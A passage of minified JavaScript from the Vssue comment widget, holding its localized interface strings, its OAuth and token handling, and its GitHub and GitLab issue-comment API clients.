n=this,e=n.$createElement,t=n._self._c||e;return t("div",{staticClass:"vssue-header"},[t("a",{staticClass:"vssue-header-comments-count",attrs:{href:n.vssue.issue?n.vssue.issue.link:null,target:"_blank",rel:"noopener noreferrer"}},[t("span",[n._v("\n      "+n._s(n.vssue.comments?n.vssue.$tc("comments",n.vssue.comments.count,{count:n.vssue.comments.count}):n.vssue.$tc("comments",0))+"\n    ")])]),n._v(" "),t("span",{staticClass:"vssue-header-powered-by"},[t("span",[n._v("Powered by")]),n._v(" "),n.vssue.API?t("span",[t("a",{attrs:{href:n.vssue.API.platform.link,title:n.vssue.API.platform.name+" API "+n.vssue.API.platform.version,target:"_blank",rel:"noopener noreferrer"}},[n._v("\n        "+n._s(n.vssue.API.platform.name)+"\n      ")]),n._v(" "),t("span",[n._v("&")])]):n._e(),n._v(" "),t("a",{attrs:{href:"https://github.com/meteorlxy/vssue",title:"Vssue v"+n.vssue.version,target:"_blank",rel:"noopener noreferrer"}},[n._v("\n      Vssue\n    ")])])])},staticRenderFns:[]},void 0,Wa,void 0,!1,void 0,!1,void 0,void 0,void 0),Va={login:"Login with {platform}",logout:"Logout",currentUser:"Current User",loading:"Loading",submit:"Submit",submitting:"Submitting",submitComment:"Submit Comment",cancel:"Cancel",edit:"Edit",editMode:"Edit Mode",delete:"Delete",reply:"Reply",heart:"Heart",like:"Like",unlike:"Unlike",perPage:"Comments per page",sort:"Click to change the sort direction",page:"Page",prev:"Previous Page",next:"Next Page",comments:"Comments | {count} Comment | {count} Comments",loginToComment:"Login with {platform} account to leave a comment",placeholder:"Leave a comment. Styling with Markdown is supported. Ctrl + Enter to submit.",noLoginPlaceHolder:"Login to leave a comment. Styling with Markdown is supported. ",failed:"Failed to load comments",initializing:"Initializing...",issueNotCreated:"Click to create issue",loadingComments:"Loading comments...",loginRequired:"Login to view comments",noComments:"No comments yet. Leave the first comment !",reactionGiven:"Already given '{reaction}' reaction",deleteConfirm:"Confirm to delete this comment ?",deleteFailed:"Failed to delete comment"},Ja={login:"使用 {platform} 登录",logout:"退出登录",currentUser:"当前用户",loading:"加载中",submit:"提交",submitting:"发表中",submitComment:"发表评论",cancel:"取消",edit:"编辑",editMode:"编辑模式",delete:"删除",reply:"回复",heart:"喜欢",like:"赞",unlike:"踩",perPage:"每页评论数",sort:"点击改变排序方式",page:"页数",prev:"上一页",next:"下一页",comments:"评论 | {count} 条评论 | {count} 条评论",loginToComment:"使用 {platform} 帐号登录后发表评论",placeholder:"留下你的评论丨支持 Markdown 语法丨Ctrl + Enter 发表评论",noLoginPlaceHolder:"登录后才能发表评论丨支持 Markdown 语法",failed:"评论加载失败",initializing:"正在初始化...",issueNotCreated:"点击创建 Issue",loadingComments:"正在加载评论...",loginRequired:"登录后查看评论",noComments:"还没有评论，来发表第一条评论吧！",reactionGiven:"已经添加过 '{reaction}' 了",deleteConfirm:"确认要删除该评论吗？",deleteFailed:"评论删除失败"},Qa={login:"Entrar com {platform}",logout:"Sair",currentUser:"Usuário Atual",loading:"Carregando",submit:"Enviar",submitting:"Enviando",submitComment:"Enviar Comentário",cancel:"Cancelar",edit:"Editar",editMode:"Modo de Edição",delete:"Apagar",reply:"Responder",heart:"Heart",like:"Like",unlike:"Unlike",perPage:"Comentários por página",sort:"Clique para alterar a ordenação",page:"Página",prev:"Página Anterior",next:"Próxima Página",comments:"Comentários | {count} Comentário | {count} Comentários",loginToComment:"Entre com uma conta {platform} para deixar um comentário",placeholder:"Deixe um comentário. Estilos com Markdown suportados. Ctrl + Enter para enviar.",noLoginPlaceHolder:"Entre para deixar um comentário. Estilos com Markdown suportados. ",failed:"Falha ao carregar comentários",initializing:"Inicializando...",issueNotCreated:"Click to create issue",loadingComments:"Carregando comentários...",loginRequired:"Entrar para visualizar comentários",noComments:"Nenhum comentário. Deixe o primeiro comentário!",reactionGiven:"Já reagiu com '{reaction}'",deleteConfirm:"Apagar este comentário?",deleteFailed:"Falha ao apagar comentário"},Ga={login:"{platform} でログイン",logout:"ログアウト",currentUser:"現在のユーザー",loading:"読み込み中",submit:"送信",submitting:"送信中",submitComment:"コメントを送信",cancel:"キャンセル",edit:"編集",editMode:"編集モード",delete:"削除",reply:"返信",heart:"ハート",like:"高評価",unlike:"低評価",perPage:"コメント/ページ",sort:"並び順を変更するにはクリックしてください",page:"ページ",prev:"前のページ",next:"次のページ",comments:"コメント | {count} コメント | {count} コメント",loginToComment:"コメントを残すには {platform} アカウントでログインしてください。",placeholder:"コメントを残してください。Markdown 記法をサポートしています。 Ctrl + Enter で送信できます。",noLoginPlaceHolder:"コメントを残すにはログインしてください。マークダウン記法をサポートしています。",failed:"コメントの読み込みに失敗しました",initializing:"初期化中...",issueNotCreated:"Click to create issue",loadingComments:"コメントの読み込み中...",loginRequired:"コメントを見るにはログインしてください",noComments:"まだコメントがありません。最初のコメントを残しましょう！",reactionGiven:"既に '{reaction}' のリアクションをしています",deleteConfirm:"本当にコメントを削除してもいいですか？",deleteFailed:"コメントの削除に失敗しました"},Xa={login:"התחברו עם {platform}",logout:"התנתקו",currentUser:"משתמש/ת נוכחי/ת",loading:"טוען",submit:"שליחה",submitting:"שולח",submitComment:"שליחת תגובה",cancel:"ביטל",edit:"עריכה",editMode:"מצב עריכה",delete:"מחיקה",reply:"תשובה",heart:"לב",like:"לייק",unlike:"אנלייק",perPage:"תגובות לדף",sort:"לחצו כדי לשנות את כיוון המיון",page:"דף",prev:"הדף הקודם",next:"הדף הבא",comments:"תגובות | {count} תגובה | {count} תגובות",loginToComment:"התחברו עם חשבון {platform} כדי להשאיר תגובה",placeholder:"השאירו תגובה. יש תמיכה בעיצוב בעזרת Markdown. Ctrl + Enter כדי לשלוח.",noLoginPlaceHolder:"התחברו כדי להשאיר תגובה. יש תמיכה בעיצוב בעזרת Markdown. ",failed:"כשלון בטעינת התגובות",initializing:"מאתחל...",issueNotCreated:"לחצו ליצירת issue",loadingComments:"טוען תגובות...",loginRequired:"התחברו כדי לצפות בתגובות",noComments:"עדיין אין תגובות. השאירו תגובה ראשונה !",reactionGiven:"כבר ניתן חיווי '{reaction}'",deleteConfirm:"בטוחים במחיקת התגובה ?",deleteFailed:"כשלון במחיקת התגובה"};Object.prototype.hasOwnProperty.call(a.a,"$i18n")||a.a.use(ka);const Ka=new ka({locale:"en",fallbackLocale:"en",messages:{en:Va,"en-US":Va,zh:Ja,"zh-CN":Ja,pt:Qa,"pt-BR":Qa,ja:Ga,"ja-JP":Ga,he:Xa,"he-IL":Xa}});let Za=class extends a.a{constructor(){super(...arguments),this.title=n=>`${n.prefix}${document.title}`,this.issueId=null,this.options=null,this.API=null,this.accessToken=null,this.user=null,this.issue=null,this.comments=null,this.query={page:1,perPage:10,sort:"desc"},this.isInitializing=!0,this.isIssueNotCreated=!1,this.isLoginRequired=!1,this.isFailed=!1,this.isCreatingIssue=!1,this.isLoadingComments=!1,this.isCreatingComment=!1,this.isUpdatingComment=!1}get version(){return"1.4.8"}get issueTitle(){return null===this.options?"":"function"==typeof this.title?this.title(this.options):`${this.options.prefix}${this.title}`}get isPending(){return this.isLoadingComments||this.isCreatingComment||this.isUpdatingComment}get isLogined(){return null!==this.accessToken&&null!==this.user}get isAdmin(){return null!==this.options&&null!==this.accessToken&&null!==this.user&&(this.user.username===this.options.owner||this.options.admins.includes(this.user.username))}get accessTokenKey(){return this.API?`Vssue.${this.API.platform.name.toLowerCase()}.access_token`:""}onQueryPerPageChange(){this.query.page=1,this.getComments()}onQueryChange(){this.getComments()}setOptions(n){this.options=Object.assign({labels:["Vssue"],state:"Vssue",prefix:"[Vssue]",admins:[],perPage:10,proxy:n=>"https://cors-anywhere.azm.workers.dev/"+n,issueContent:({url:n})=>n,autoCreateIssue:!1},n);const e=["api","owner","repo","clientId"];for(const n of e)this.options[n]||console.warn(`[Vssue] the option '${n}' is required`);if(this.options.locale)this.$i18n.locale=this.options.locale;else{const n=Object.keys(this.$i18n.messages),e=window.navigator.languages;this.$i18n.locale=e.filter(e=>n.includes(e)).shift()||"en"}}async init(){try{await this.initStore(),await this.initComments()}catch(n){n.response&&[401,403].includes(n.response.status)?this.isLoginRequired=!0:this.isFailed=!0,console.error(n)}}async initStore(){try{if(!this.options)throw new Error("Options are required to initialize Vssue");this.API=null,this.accessToken=null,this.user=null,this.issue=null,this.comments=null,this.query={page:1,perPage:this.options.perPage,sort:"desc"},this.isInitializing=!0,this.isIssueNotCreated=!1,this.isLoginRequired=!1,this.isFailed=!1,this.isCreatingIssue=!1,this.isLoadingComments=!1,this.isCreatingComment=!1,this.isUpdatingComment=!1;const n=this.options.api;this.API=new n({baseURL:this.options.baseURL,labels:this.options.labels,state:this.options.state,owner:this.options.owner,repo:this.options.repo,clientId:this.options.clientId,clientSecret:this.options.clientSecret,proxy:this.options.proxy}),await this.handleAuth()}finally{this.isInitializing=!1}}async initComments(){if(this.API&&this.options)if(this.issueId){const[n,e]=await Promise.all([this.API.getIssue({accessToken:this.accessToken,issueId:this.issueId}),this.API.getComments({accessToken:this.accessToken,issueId:this.issueId,query:this.query})]);this.issue=n,this.comments=e}else this.issue=await this.API.getIssue({accessToken:this.accessToken,issueTitle:this.issueTitle}),null===this.issue?(this.isIssueNotCreated=!0,this.options.autoCreateIssue&&await this.postIssue()):await this.getComments()}async postIssue(){if(this.API&&this.options&&!this.issue&&!this.issueId&&(this.isLogined||this.login(),this.isAdmin))try{this.isCreatingIssue=!0;const n=await this.API.postIssue({title:this.issueTitle,content:await this.options.issueContent({options:this.options,url:Tt(window.location.href)}),accessToken:this.accessToken});this.issue=n,this.isIssueNotCreated=!1,await this.getComments()}catch(n){this.isFailed=!0}finally{this.isCreatingIssue=!1}}async getComments(){try{if(!this.API||!this.issue||this.isLoadingComments)return;this.isLoadingComments=!0;const n=await this.API.getComments({accessToken:this.accessToken,issueId:this.issue.id,query:this.query});return this.comments=n,this.query.page!==n.page&&(this.query.page=n.page),this.query.perPage!==n.perPage&&(this.query.perPage=n.perPage),n}catch(n){if(!n.response||![401,403].includes(n.response.status)||this.isLogined)throw this.$emit("error",n),n;this.isLoginRequired=!0}finally{this.isLoadingComments=!1}}async postComment({content:n}){try{if(!this.API||!this.issue||this.isCreatingComment)return;this.isCreatingComment=!0;return await this.API.postComment({accessToken:this.accessToken,content:n,issueId:this.issue.id})}catch(n){throw this.$emit("error",n),n}finally{this.isCreatingComment=!1}}async putComment({commentId:n,content:e}){try{if(!this.API||!this.issue)return;return await this.API.putComment({accessToken:this.accessToken,issueId:this.issue.id,commentId:n,content:e})}catch(n){throw this.$emit("error",n),n}}async deleteComment({commentId:n}){try{if(!this.API||!this.issue)return;return await this.API.deleteComment({accessToken:this.accessToken,issueId:this.issue.id,commentId:n})}catch(n){throw this.$emit("error",n),n}}async getCommentReactions({commentId:n}){try{if(!this.API||!this.issue)return;return await this.API.getCommentReactions({accessToken:this.accessToken,issueId:this.issue.id,commentId:n})}catch(n){throw this.$emit("error",n),n}}async postCommentReaction({commentId:n,reaction:e}){try{if(!this.API||!this.issue)return!1;return await this.API.postCommentReaction({accessToken:this.accessToken,issueId:this.issue.id,commentId:n,reaction:e})}catch(n){throw this.$emit("error",n),n}}login(){this.API&&this.API.redirectAuth()}logout(){this.setAccessToken(null),this.user=null}async handleAuth(){if(!this.API)return;const n=await this.API.handleAuth();n?(this.setAccessToken(n),this.user=await this.API.getUser({accessToken:n})):this.getAccessToken()?this.user=await this.API.getUser({accessToken:this.accessToken}):(this.setAccessToken(null),this.user=null)}getAccessToken(){return this.accessToken=window.localStorage.getItem(this.accessTokenKey),this.accessToken}setAccessToken(n){null===n?window.localStorage.removeItem(this.accessTokenKey):window.localStorage.setItem(this.accessTokenKey,n),this.accessToken=n}};Sa([bt("query.perPage")],Za.prototype,"onQueryPerPageChange",null),Sa([bt("query.page"),bt("query.sort")],Za.prototype,"onQueryChange",null),Za=Sa([lt({i18n:Ka})],Za);var Ya=Za;let nr=class extends a.a{constructor(){super(...arguments),this.vssue=new Ya}onOptionsChange(n){this.vssue.setOptions(n)}mounted(){null!==this.title&&(this.vssue.title=this.title),null!==this.issueId&&(this.vssue.issueId=this.issueId),this.vssue.setOptions(this.options),this.vssue.init()}};var er;Sa([ft({type:[String,Function],required:!1,default:null})],nr.prototype,"title",void 0),Sa([ft({type:[String,Number],required:!1,default:null})],nr.prototype,"issueId",void 0),Sa([ft({type:Object,required:!1,default:()=>({})})],nr.prototype,"options",void 0),Sa([(er="vssue",et((function(n,e){var t=n.provide;mt(n),pt(t)&&(t=n.provide=dt(t)),t.managed[e]=er||e})))],nr.prototype,"vssue",void 0),Sa([bt("options",{deep:!0})],nr.prototype,"onOptionsChange",null),nr=Sa([lt({components:{Iconfont:ja,VssueBody:$a,VssueHeader:Ha}})],nr);const tr=Ta({render:function(){var n=this.$createElement,e=this._self._c||n;return e("div",{staticClass:"vssue"},[e("Iconfont"),this._v(" "),e("VssueHeader"),this._v(" "),e("VssueBody")],1)},staticRenderFns:[]},void 0,nr,void 0,!1,void 0,!1,void 0,void 0,void 0);var ar=t(4),rr=t.n(ar);function or(n){return{username:n.login,avatar:n.avatar_url,homepage:n.html_url}}function ir(n){return{id:n.number,title:n.title,content:n.body,link:n.html_url}}function sr(n){return{like:n["+1"],unlike:n[-1],heart:n.heart}}function lr(n){return{id:n.id,content:n.body_html,contentRaw:n.body,author:or(n.user),createdAt:n.created_at,updatedAt:n.updated_at,reactions:sr(n.reactions)}}function cr(n){return"like"===n?"+1":"unlike"===n?"-1":n}class pr{constructor({baseURL:n="https://github.com",owner:e,repo:t,labels:a,clientId:r,clientSecret:o,state:i,proxy:s}){if(void 0===o||void 0===s)throw new Error("clientSecret and proxy is required for GitHub V3");this.baseURL=n,this.owner=e,this.repo=t,this.labels=a,this.clientId=r,this.clientSecret=o,this.state=i,this.proxy=s,this.$http=rr.a.create({baseURL:"https://github.com"===n?"https://api.github.com":wt(n,"api/v3"),headers:{Accept:"application/vnd.github.v3+json"}}),this.$http.interceptors.response.use(n=>n.data&&n.data.error?Promise.reject(new Error(n.data.error_description)):n,n=>(void 0===n.response&&"Network Error"===n.message&&(n.response={status:403}),Promise.reject(n)))}get platform(){return{name:"GitHub",link:this.baseURL,version:"v3",meta:{reactable:!0,sortable:!1}}}redirectAuth(){window.location.href=xt(wt(this.baseURL,"login/oauth/authorize"),{client_id:this.clientId,redirect_uri:window.location.href,scope:"public_repo",state:this.state})}async handleAuth(){const n=jt(window.location.search);if(n.code){if(n.state!==this.state)return null;const e=n.code;delete n.code,delete n.state;const t=xt(Tt(window.location.href),n)+window.location.hash;window.history.replaceState(null,"",t);return await this.getAccessToken({code:e})}return null}async getAccessToken({code:n}){const e=wt(this.baseURL,"login/oauth/access_token"),t="function"==typeof this.proxy?this.proxy(e):this.proxy,{data:a}=await this.$http.post(t,{client_id:this.clientId,client_secret:this.clientSecret,code:n},{headers:{Accept:"application/json"}});return a.access_token}async getUser({accessToken:n}){const{data:e}=await this.$http.get("user",{headers:{Authorization:"token "+n}});return or(e)}async getIssue({accessToken:n,issueId:e,issueTitle:t}){const a={};if(n&&(a.headers={Authorization:"token "+n}),!e){a.params={q:[`"${t}"`,"is:issue","in:title",`repo:${this.owner}/${this.repo}`,"is:public",...this.labels.map(n=>"label:"+n)].join(" "),timestamp:Date.now()};const{data:n}=await this.$http.get("search/issues",a);return n.items.map(ir).find(n=>n.title===t)||null}try{a.params={timestamp:Date.now()};const{data:n}=await this.$http.get(`repos/${this.owner}/${this.repo}/issues/${e}`,a);return ir(n)}catch(n){if(n.response&&404===n.response.status)return null;throw n}}async postIssue({accessToken:n,title:e,content:t}){const{data:a}=await this.$http.post(`repos/${this.owner}/${this.repo}/issues`,{title:e,body:t,labels:this.labels},{headers:{Authorization:"token "+n}});return ir(a)}async getComments({accessToken:n,issueId:e,query:{page:t=1,perPage:a=10}={}}){const r={params:{timestamp:Date.now()}},o={params:{page:t,per_page:a,timestamp:Date.now()},headers:{Accept:["application/vnd.github.v3.raw+json","application/vnd.github.v3.html+json","application/vnd.github.squirrel-girl-preview"]}};n&&(r.headers={Authorization:"token "+n},o.headers.Authorization="token "+n);const[i,s]=await Promise.all([this.$http.get(`repos/${this.owner}/${this.repo}/issues/${e}`,r),this.$http.get(`repos/${this.owner}/${this.repo}/issues/${e}/comments`,o)]),l=s.headers.link||null,c=/rel="next"/.test(l)?Number(l.replace(/^.*[^_]page=(\d*).*rel="next".*$/,"$1"))-1:/rel="prev"/.test(l)?Number(l.replace(/^.*[^_]page=(\d*).*rel="prev".*$/,"$1"))+1:1,p=l?Number(l.replace(/^.*per_page=(\d*).*$/,"$1")):a;return{count:Number(i.data.comments),page:c,perPage:p,data:s.data.map(lr)}}async postComment({accessToken:n,issueId:e,content:t}){const{data:a}=await this.$http.post(`repos/${this.owner}/${this.repo}/issues/${e}/comments`,{body:t},{headers:{Authorization:"token "+n,Accept:["application/vnd.github.v3.raw+json","application/vnd.github.v3.html+json","application/vnd.github.squirrel-girl-preview"]}});return lr(a)}async putComment({accessToken:n,commentId:e,content:t}){const{data:a}=await this.$http.patch(`repos/${this.owner}/${this.repo}/issues/comments/${e}`,{body:t},{headers:{Authorization:"token "+n,Accept:["application/vnd.github.v3.raw+json","application/vnd.github.v3.html+json","application/vnd.github.squirrel-girl-preview"]}});return lr(a)}async deleteComment({accessToken:n,commentId:e}){const{status:t}=await this.$http.delete(`repos/${this.owner}/${this.repo}/issues/comments/${e}`,{headers:{Authorization:"token "+n}});return 204===t}async getCommentReactions({accessToken:n,commentId:e}){const{data:t}=await this.$http.get(`repos/${this.owner}/${this.repo}/issues/comments/${e}`,{params:{timestamp:Date.now()},headers:{Authorization:"token "+n,Accept:"application/vnd.github.squirrel-girl-preview"}});return sr(t.reactions)}async postCommentReaction({accessToken:n,commentId:e,reaction:t}){const a=await this.$http.post(`repos/${this.owner}/${this.repo}/issues/comments/${e}/reactions`,{content:cr(t)},{headers:{Authorization:"token "+n,Accept:"application/vnd.github.squirrel-girl-preview"}});return 200===a.status?this.deleteCommentReaction({accessToken:n,commentId:e,reactionId:a.data.id}):201===a.status}async deleteCommentReaction({accessToken:n,commentId:e,reactionId:t}){return 204===(await this.$http.delete(`repos/${this.owner}/${this.repo}/issues/comments/${e}/reactions/${t}`,{headers:{Authorization:"token "+n,Accept:"application/vnd.github.squirrel-girl-preview"}})).status}}function dr(n){return null===n?{username:"ghost",avatar:"https://avatars3.githubusercontent.com/u/10137?v=4",homepage:"https://github.com/ghost"}:{username:n.login,avatar:n.avatarUrl,homepage:n.url}}function ur(n){return{id:n.number,title:n.title,content:n.body,link:n.url}}function mr(n){return{like:n.find(n=>"THUMBS_UP"===n.content).users.totalCount,unlike:n.find(n=>"THUMBS_DOWN"===n.content).users.totalCount,heart:n.find(n=>"HEART"===n.content).users.totalCount}}function hr(n){return{id:n.id,content:n.bodyHTML,contentRaw:n.body,author:dr(n.author),createdAt:n.createdAt,updatedAt:n.updatedAt,reactions:mr(n.reactionGroups)}}function gr(n){return"like"===n?"THUMBS_UP":"unlike"===n?"THUMBS_DOWN":"heart"===n?"HEART":n}class fr{constructor({baseURL:n="https://github.com",owner:e,repo:t,labels:a,clientId:r,clientSecret:o,state:i,proxy:s}){if(void 0===o||void 0===s)throw new Error("clientSecret and proxy is required for GitHub V4");this.baseURL=n,this.owner=e,this.repo=t,this.labels=a,this.clientId=r,this.clientSecret=o,this.state=i,this.proxy=s,this._pageInfo={page:1,startCursor:null,endCursor:null,sort:null,perPage:null},this._issueNodeId=null,this.$http=rr.a.create({baseURL:"https://github.com"===n?"https://api.github.com":wt(n,"api"),headers:{Accept:"application/vnd.github.v3+json"}}),this.$http.interceptors.response.use(n=>n.data.error?Promise.reject(n.data.error_description):n.data.errors?Promise.reject(n.data.errors[0].message):n)}get platform(){return{name:"GitHub",link:this.baseURL,version:"v4",meta:{reactable:!0,sortable:!0}}}redirectAuth(){window.location.href=xt(wt(this.baseURL,"login/oauth/authorize"),{client_id:this.clientId,redirect_uri:window.location.href,scope:"public_repo",state:this.state})}async handleAuth(){const n=jt(window.location.search);if(n.code){if(n.state!==this.state)return null;const e=n.code;delete n.code,delete n.state;const t=xt(Tt(window.location.href),n)+window.location.hash;window.history.replaceState(null,"",t);return await this.getAccessToken({code:e})}return null}async getAccessToken({code:n}){const e=wt(this.baseURL,"login/oauth/access_token"),t="function"==typeof this.proxy?this.proxy(e):this.proxy,{data:a}=await this.$http.post(t,{client_id:this.clientId,client_secret:this.clientSecret,code:n},{headers:{Accept:"application/json"}});return a.access_token}async getUser({accessToken:n}){const{data:e}=await this.$http.post("graphql",{query:"query getUser {\n  viewer {\n    login\n    avatarUrl\n    url\n  }\n}"},{headers:{Authorization:"token "+n}});return dr(e.data.viewer)}async getIssue({accessToken:n,issueId:e,issueTitle:t}){const a={};if(n&&(a.headers={Authorization:"token "+n}),!e){const n=[`"${t}"`,"in:title",`repo:${this.owner}/${this.repo}`,"is:public",...this.labels.map(n=>"label:"+n)].join(" "),{data:e}=await this.$http.post("graphql",{variables:{query:n},query:"query getIssueByTitle(\n  $query: String!\n) {\n  search(\n    query: $query\n    type: ISSUE\n    first: 20\n    ) {\n      nodes {\n      ... on Issue {\n        id\n        number\n        title\n        body\n        url\n      }\n    }\n  }\n}"},a),r=e.data.search.nodes.find(n=>n.title===t);return r?(this._issueNodeId=r.id,ur(r)):null}try{const{data:n}=await this.$http.post("graphql",{query:`query getIssueById {\n  repository(owner: "${this.owner}", name: "${this.repo}") {\n    issue (number: ${e}) {\n      id\n      number\n      title\n      body\n      url\n    }\n  }\n}`},a);return this._issueNodeId=n.data.repository.issue.id,ur(n.data.repository.issue)}catch(n){if(n.response&&404===n.response.status)return null;throw n}}async postIssue({accessToken:n,title:e,content:t}){const{data:a}=await this.$http.post(`repos/${this.owner}/${this.repo}/issues`,{title:e,body:t,labels:this.labels},{headers:{Authorization:"token "+n}});return a.url=a.html_url,this._issueNodeId=a.node_id,ur(a)}async getComments({accessToken:n,issueId:e,query:{page:t=1,perPage:a=10,sort:r="desc"}={}}){const o={};n&&(o.headers={Authorization:"token "+n}),null!==this._pageInfo.sort&&r!==this._pageInfo.sort&&(t=1);const{firstOrLast:i,afterOrBefore:s,cursor:l}=this._getQueryParams({page:t,sort:r}),{data:c}=await this.$http.post("graphql",{variables:{owner:this.owner,repo:this.repo,issueId:e,perPage:a},query:`query getComments(\n  $owner: String!\n  $repo: String!\n  $issueId: Int!\n  $perPage: Int!\n) {\n  repository(owner: $owner, name: $repo) {\n    issue(number: $issueId) {\n      comments(\n        ${i}: $perPage\n        ${null===s?"":`${s}: "${l}"`}\n      ) {\n        totalCount\n        pageInfo {\n          endCursor\n          startCursor\n        }\n        nodes {\n          id\n          body\n          bodyHTML\n          createdAt\n          updatedAt\n          author {\n            avatarUrl\n            login\n            url\n          }\n          reactionGroups {\n            users (first: 0) {\n              totalCount\n            }\n            content\n          }\n        }\n      }\n    }\n  }\n}`},o),p=c.data.repository.issue.comments;return"desc"===r&&p.nodes.reverse(),this._pageInfo={page:t,startCursor:p.pageInfo.startCursor,endCursor:p.pageInfo.endCursor,sort:r,perPage:a},{count:p.totalCount,page:t,perPage:a,data:p.nodes.map(hr)}}async postComment({accessToken:n,content:e}){const{data:t}=await this.$http.post("graphql",{variables:{issueNodeId:this._issueNodeId,content:e},query:"mutation postComment(\n  $issueNodeId: ID!\n  $content: String!\n) {\n  addComment(\n    input: {\n      subjectId: $issueNodeId\n      body: $content\n    }\n  ) {\n    commentEdge {\n      node {\n        id\n        body\n        bodyHTML\n        createdAt\n        updatedAt\n        author {\n          avatarUrl\n          login\n          url\n        }\n        reactionGroups {\n          users (first: 0) {\n            totalCount\n          }\n          content\n        }\n      }\n    }\n  }\n}"},{headers:{Authorization:"token "+n}});return hr(t.data.addComment.commentEdge.node)}async putComment({accessToken:n,commentId:e,content:t}){const{data:a}=await this.$http.post("graphql",{variables:{commentId:e,content:t},query:"mutation putComment(\n  $commentId: ID!,\n  $content: String!,\n) {\n  updateIssueComment(input: {\n    id: $commentId\n    body: $content\n  }) {\n    issueComment {\n      id\n      body\n      bodyHTML\n      createdAt\n      updatedAt\n      author {\n        avatarUrl\n        login\n        url\n      }\n      reactionGroups {\n        users (first: 0) {\n          totalCount\n        }\n        content\n      }\n    }\n  }\n}"},{headers:{Authorization:"token "+n}});return hr(a.data.updateIssueComment.issueComment)}async deleteComment({accessToken:n,commentId:e}){return await this.$http.post("graphql",{variables:{commentId:e},query:"mutation deleteComment(\n  $commentId: ID!,\n) {\n  deleteIssueComment(input: {\n    id: $commentId\n  }) {\n    clientMutationId\n  }\n}"},{headers:{Authorization:"token "+n}}),!0}async getCommentReactions({accessToken:n,issueId:e,commentId:t}){const{firstOrLast:a,afterOrBefore:r,cursor:o}=this._getQueryParams(),{data:i}=await this.$http.post("graphql",{variables:{owner:this.owner,repo:this.repo,issueId:e,perPage:this._pageInfo.perPage},query:`query getComments(\n  $owner: String!\n  $repo: String!\n  $issueId: Int!\n  $perPage: Int!\n) {\n  repository(owner: $owner, name: $repo) {\n    issue(number: $issueId) {\n      comments(\n        ${a}: $perPage\n        ${null===r?"":`${r}: "${o}"`}\n      ) {\n        nodes {\n          id\n          reactionGroups {\n            users (first: 0) {\n              totalCount\n            }\n            content\n          }\n        }\n      }\n    }\n  }\n}`},{headers:{Authorization:"token "+n}});return mr(i.data.repository.issue.comments.nodes.find(n=>n.id===t).reactionGroups)}async postCommentReaction({accessToken:n,commentId:e,reaction:t}){return await this.$http.post("graphql",{variables:{commentId:e,content:gr(t)},query:"mutation postCommentReaction(\n  $commentId: ID!,\n  $content: ReactionContent!,\n) {\n  addReaction(input: {\n    subjectId: $commentId\n    content: $content\n  }) {\n    reaction {\n      databaseId\n    }\n  }\n}"},{headers:{Authorization:"token "+n}}),!0}_getQueryParams({page:n=this._pageInfo.page,sort:e=this._pageInfo.sort}={}){let t,a,r;return 1===n?(t="asc"===e?"first":"last",a=null,r=null):"asc"===e?n>this._pageInfo.page?(t="first",a="after",r=this._pageInfo.endCursor):(t="last",a="before",r=this._pageInfo.startCursor):n>this._pageInfo.page?(t="last",a="before",r=this._pageInfo.startCursor):(t="first",a="after",r=this._pageInfo.endCursor),{firstOrLast:t,afterOrBefore:a,cursor:r}}}function br(n){return{username:n.username,avatar:n.avatar_url,homepage:n.web_url}}function vr(n){return{id:n.iid,title:n.title,content:n.description,link:n.web_url}}function yr(n){return{id:n.id,content:n.body_html||"",contentRaw:n.body,author:br(n.author),createdAt:n.created_at,updatedAt:n.updated_at,reactions:n.reactions}}function xr(n){return{like:n.filter(n=>"thumbsup"===n.name).length,unlike:n.filter(n=>"thumbsdown"===n.name).length,heart:n.filter(n=>"heart"===n.name).length}}function wr(n){return"like"===n?"thumbsup":"unlike"===n?"thumbsdown":n}class kr{constructor({baseURL:n="https://gitlab.com",owner:e,repo:t,labels:a,clientId:r,state:o}){this.baseURL=n,this.owner=e,this.repo=t,this.labels=a,this.clientId=r,this.state=o,this._encodedRepo=encodeURIComponent(`${this.owner}/${this.repo}`),this.$http=rr.a.create({baseURL:wt(n,"api/v4"),headers:{Accept:"application/json"}})}get platform(){return{name:"GitLab",link:this.baseURL,version:"v4",meta:{reactable:!0,sortable:!0}}}redirectAuth(){window.location.href=xt(wt(this.baseURL,"oauth/authorize"),{client_id:this.clientId,redirect_uri:window.location.href,response_type:"token",state:this.state})}async handleAuth(){const n=jt(window.location.hash.slice(1));if(!n.access_token||n.state!==this.state)return null;const e=n.access_token;delete n.access_token,delete n.token_type,delete n.expires_in,delete n.state;const t=yt(n),a=t?"#"+t:"",r=`${Tt(window.location.href)}${window.location.search}${a}`;return window.history.replaceState(null,"",r),e}async getUser({accessToken:n}){const{data:e}=await this.$http.get("user",{headers:{Authorization:"Bearer "+n}});return br(e)}async getIssue({accessToken:n,issueId:e,issueTitle:t}){const a={};if(n&&(a.headers={Authorization:"Bearer "+n}),!e){a.params={labels:this.labels.join(","),order_by:"created_at",sort:"asc",search:t};const{data:n}=await this.$http.get(`projects/${this._encodedRepo}/issues`,a);return n.map(vr).find(n=>n.title===t)||null}try{const{data:n}=await this.$http.get(`projects/${this._encodedRepo}/issues/${e}`,a);return vr(n)}catch(n){if(n.response&&404===n.response.status)return null;throw n}}async postIssue({accessToken:n,title:e,content:t}){const{data:a}=await this.$http.post(`projects/${this._encodedRepo}/issues`,{title:e,description:t,labels:this.labels.join(",")},{headers:{Authorization:"Bearer "+n}});return vr(a)}async getComments({accessToken:n,issueId:e,query:{page:t=1,perPage:a=10,sort:r="desc"}={}}){const o={params:{page:t,per_page:a,order_by:"created_at",sort:r}};n&&(o.headers={Authorization:"Bearer "+n});const i=await this.$http.get(`projects/${this._encodedRepo}/issues/${e}/notes`,o),s=i.data,l=[];for(const t of s)l.push((async()=>{t.body_html=await this.getMarkdownContent({accessToken:n,contentRaw:t.body})})()),l.push((async()=>{t.reactions=await this.getCommentReactions({accessToken:n,issueId:e,commentId:t.id})})());return await Promise.all(l),{count:Number(i.headers["x-total"]),page:Number(i.headers["x-page"]),perPage:Number(i.headers["x-per-page"]),data:s.map(yr)}}async postComment({accessToken:n,issueId:e,content:t}){const{data:a}=await this.$http.post(`projects/${this._encodedRepo}/issues/${e}/notes`,{body:t},{headers:{Authorization:"Bearer "+n}});return yr(a)}async putComment({accessToken:n,issueId:e,commentId:t,content:a}){const{data:r}=await this.$http.put(`projects/${this._encodedRepo}/issues/${e}/notes/${t}`,{body:a},{headers:{Authorization:"Bearer "+n}}),[o,i]=await Promise.all([this.getMarkdownContent({accessToken:n,contentRaw:r.body}),this.getCommentReactions({accessToken:n,issueId:e,commentId:r.id})]);return r.body_html=o,r.reactions=i,yr(r)}async 